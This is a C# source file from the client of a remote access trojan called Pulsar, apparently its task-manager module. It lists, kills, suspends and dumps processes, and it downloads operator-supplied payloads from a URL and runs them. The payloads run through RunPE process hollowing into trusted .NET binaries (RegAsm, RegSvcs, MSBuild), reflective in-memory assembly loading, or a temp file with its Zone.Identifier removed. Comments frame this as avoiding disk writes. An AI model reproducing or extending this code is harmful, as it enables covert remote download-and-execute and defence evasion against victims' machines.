using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.Helper;
using Pulsar.Common;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with tasks.
    /// </summary>
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly PulsarClient _client;

        private readonly WebClient _webClient;

        public TaskManagerHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadDataCompleted += OnDownloadDataCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                if (_webClient.IsBusy)
                    _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                             message is DoProcessStart ||
                                                             message is DoProcessEnd ||
                                                             message is DoProcessDump ||
                                                             message is DoSetTopMost ||
                                                             message is DoSuspendProcess;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg:
                    Execute(sender, msg);
                    break;
                case DoProcessStart msg:
                    Execute(sender, msg);
                    break;
                case DoProcessEnd msg:
                    Execute(sender, msg);
                    break;
                case DoProcessDump msg:
                    Execute(sender, msg);
                    break;
                case DoSuspendProcess msg:
                    Execute(sender, msg);
                    break;
                case DoSetTopMost msg:
                    Execute(sender, msg);
                    break;
            }
        }
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        private void Execute(ISender client, DoSetTopMost message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                    return;
                }

                const int HWND_TOPMOST = -1;
                const int HWND_NOTOPMOST = -2;
                const uint SWP_NOSIZE = 0x0001;
                const uint SWP_NOMOVE = 0x0002;
                const uint SWP_SHOWWINDOW = 0x0040;

                IntPtr hWndInsertAfter = new IntPtr(message.Enable ? HWND_TOPMOST : HWND_NOTOPMOST);
                bool result = Utilities.NativeMethods.SetWindowPos(
                    proc.MainWindowHandle,
                    hWndInsertAfter,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                );

                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = result });
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
            }
        }

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];
            var parentMap = GetParentProcessMap();

            for (int i = 0; i < pList.Length; i++)
            {
                var process = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle,
                    ParentId = parentMap.TryGetValue(pList[i].Id, out var parentId) ? parentId : null
                };
                processes[i] = process;
            }

            int currentPid = Process.GetCurrentProcess().Id;

            client.Send(new GetProcessesResponse { Processes = processes, RatPid = currentPid });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            Debug.WriteLine("Starting process: " + message.FilePath + " | DownloadUrl: " + message.DownloadUrl);

            if (string.IsNullOrEmpty(message.FilePath) && (message.FileBytes == null || message.FileBytes.Length == 0))
            {
                // download into memory and then execute
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    return;
                }

                try
                {
                    if (_webClient.IsBusy)
                    {
                        _webClient.CancelAsync();
                        while (_webClient.IsBusy)
                        {
                            Thread.Sleep(50);
                        }
                    }

                    // Download directly to memory instead of temp file
                    _webClient.DownloadDataAsync(new Uri(message.DownloadUrl), message);
                }
                catch
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                }
            }
            else
            {
                // execute from byte array (already in memory) or from file path
                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
            }
        }

        private void OnDownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            var message = (DoProcessStart)e.UserState;
            if (e.Cancelled || e.Error != null)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                return;
            }

            // Execute directly from downloaded bytes (never touches disk)
            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
        }

        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory = false, bool useRunPE = false, string runPETarget = null, string runPECustomPath = null, string fileExtension = null)
        {
            Debug.WriteLine($"ExecuteProcess called: filePath={filePath}, fileBytes={(fileBytes != null ? fileBytes.Length : 0)} bytes, isUpdate={isUpdate}, executeInMemory={executeInMemory}, useRunPE={useRunPE}, runPETarget={runPETarget}, fileExtension={fileExtension}");
            
            // If we have a file path but no bytes, read the file
            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
            {
                fileBytes = File.ReadAllBytes(filePath);
            }

            if (fileBytes == null || fileBytes.Length == 0)
            {
                Debug.WriteLine("ExecuteProcess: No file bytes available!");
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                return;
            }
            
            if (isUpdate)
            {
                try
                {
                    // For updates, we need to write to a temp file temporarily
                    string tempPath = FileHelper.GetTempFilePath(".exe");
                    File.WriteAllBytes(tempPath, fileBytes);
                    
                    var clientUpdater = new ClientUpdater();
                    clientUpdater.Update(tempPath);
                    _client.Exit();
                }
                catch (Exception ex)
                {
                    _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                }
            }
            else
            {
                try
                {
                    if (useRunPE)
                    {
                        ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
                        return;
                    }

                    if (executeInMemory)
                    {
                        ExecuteViaInMemoryDotNet(fileBytes);
                        return;
                    }

                    ExecuteViaTemporaryFile(fileBytes, fileExtension);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"ExecuteProcess exception: {ex.Message}");
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                }
            }
        }

        /// <summary>
        /// Executes a payload using the RunPE technique (in-memory, no disk writes).
        /// </summary>
        private void ExecuteViaRunPE(byte[] fileBytes, string runPETarget, string runPECustomPath)
        {
            Debug.WriteLine("Executing via RunPE (in-memory, no disk writes)...");
            new Thread(() =>
            {
                try
                {
                    bool isPayload64Bit = IsPayload64Bit(fileBytes);
                    Debug.WriteLine($"Detected payload architecture: {(isPayload64Bit ? "x64" : "x86")}");
                    
                    string hostPath = GetRunPEHostPath(runPETarget, runPECustomPath, isPayload64Bit);

                    Debug.WriteLine($"RunPE: hostPath={hostPath}, payload size={fileBytes.Length}");

                    if (string.IsNullOrEmpty(hostPath))
                    {
                        Debug.WriteLine("RunPE: hostPath is null or empty!");
                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                        return;
                    }

                    bool result = Helper.RunPE.Execute(hostPath, fileBytes);
                    Debug.WriteLine($"RunPE execution result: {result}");
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("RunPE execution failed: " + ex.Message);
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                }
            }).Start();
        }

        /// <summary>
        /// Executes a .NET assembly in-memory using reflection (no disk writes).
        /// </summary>
        private void ExecuteViaInMemoryDotNet(byte[] fileBytes)
        {
            Debug.WriteLine("Executing via .NET Memory Execution (in-memory, no disk writes)...");
            new Thread(() =>
            {
                try
                {
                    Assembly asm = Assembly.Load(fileBytes);
                    MethodInfo entryPoint = asm.EntryPoint;
                    if (entryPoint != null)
                    {
                        object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[0] };
                        entryPoint.Invoke(null, parameters);
                    }
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($".NET Memory Execution failed: {ex.Message}");
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                }
            }).Start();
        }

        /// <summary>
        /// Executes a file via temporary file (disk write required for normal process execution).
        /// </summary>
        private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
        {
            Debug.WriteLine("Executing via temporary file (disk write required for normal process execution)...");
            try
            {
                string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                File.WriteAllBytes(tempPath, fileBytes);
                FileHelper.DeleteZoneIdentifier(tempPath);
                
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = tempPath
                };
                Process.Start(startInfo);
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Temporary file execution failed: {ex.Message}");
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
            }
        }

        private string GetRunPEHostPath(string target, string customPath, bool isPayload64Bit)
        {
            // Choose the appropriate .NET Framework directory based on payload architecture
            string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string frameworkDir;
            
            if (isPayload64Bit)
            {
                // Use 64-bit framework for 64-bit payloads
                frameworkDir = Path.Combine(windowsDir, "Microsoft.NET", "Framework64", "v4.0.30319");
                Debug.WriteLine($"[GetRunPEHostPath] Using 64-bit framework for x64 payload: {frameworkDir}");
            }
            else
            {
                // Use 32-bit framework for 32-bit payloads
                frameworkDir = Path.Combine(windowsDir, "Microsoft.NET", "Framework", "v4.0.30319");
                Debug.WriteLine($"[GetRunPEHostPath] Using 32-bit framework for x86 payload: {frameworkDir}");
            }
            
            // Fallback to current runtime if target framework doesn't exist
            if (!Directory.Exists(frameworkDir))
            {
                frameworkDir = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory();
                Debug.WriteLine($"[GetRunPEHostPath] Target framework not found, using current runtime: {frameworkDir}");
            }

            switch (target)
            {
                case "a":
                    return Path.Combine(frameworkDir, "RegAsm.exe");
                case "b":
                    return Path.Combine(frameworkDir, "RegSvcs.exe");
                case "c":
                    return Path.Combine(frameworkDir, "MSBuild.exe");
                case "d":
                    return customPath;
                default:
                    return Path.Combine(frameworkDir, "RegAsm.exe");
            }
        }

        private bool IsPayload64Bit(byte[] payload)
        {
            try
            {
                if (payload.Length < 0x40 || payload[0] != 'M' || payload[1] != 'Z')
                    return false;

                int peOffset = BitConverter.ToInt32(payload, 0x3C);
                if (peOffset + 6 > payload.Length)
                    return false;

                ushort machine = BitConverter.ToUInt16(payload, peOffset + 4);
                return machine == 0x8664; // IMAGE_FILE_MACHINE_AMD64
            }
            catch
            {
                return false;
            }
        }

        private Dictionary<int, int?> GetParentProcessMap()
        {
            var parentMap = new Dictionary<int, int?>();

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ParentProcessId FROM Win32_Process"))
                using (var results = searcher.Get())
                {
                    foreach (ManagementObject obj in results)
                    {
                        try
                        {
                            if (obj["ProcessId"] is uint pidValue)
                            {
                                int pid = unchecked((int)pidValue);
                                int? parentId = null;

                                if (obj["ParentProcessId"] is uint parentValue)
                                {
                                    int parent = unchecked((int)parentValue);
                                    if (parent > 0 && parent != pid)
                                    {
                                        parentId = parent;
                                    }
                                }

                                parentMap[pid] = parentId;
                            }
                        }
                        finally
                        {
                            obj?.Dispose();
                        }
                    }
                }
            }
            catch (ManagementException)
            {
                // wmi doesn't fucking work
            }
            catch (System.Runtime.InteropServices.COMException)
            {
                // no fucking com access
            }
            catch
            {
                // who tf knows
            }

            return parentMap;
        }

        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process.GetProcessById(message.Pid).Kill();
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
            }
        }

        private void Execute(ISender client, DoProcessDump message)
        {
            string dump;
            bool success;
            Process proc = Process.GetProcessById(message.Pid);
            (dump, success) = DumpHelper.GetProcessDump(message.Pid);
            if (success)
            {
                // Could add a zip here later (idk how big a dump will be)
                FileInfo dumpInfo = new FileInfo(dump);
                client.Send(new DoProcessDumpResponse { Result = success, DumpPath = dump, Length = dumpInfo.Length, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = "", UnixTime = DateTime.Now.Ticks });
            }
            else
            {
                client.Send(new DoProcessDumpResponse { Result = success, DumpPath = "", Length = 0, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = dump, UnixTime = DateTime.Now.Ticks });
            }
        }

        private void Execute(ISender client, DoSuspendProcess message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    //why tf is there a native methods section in common and why is it being used.
                    //TODO: Change that shit. The server should NEVER need any of that. Useless to store it there.
                    Utilities.NativeMethods.NtSuspendProcess(proc.Handle);
                    client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = true });
                }
                else
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = false });
                }
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = false });
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadDataCompleted -= OnDownloadDataCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
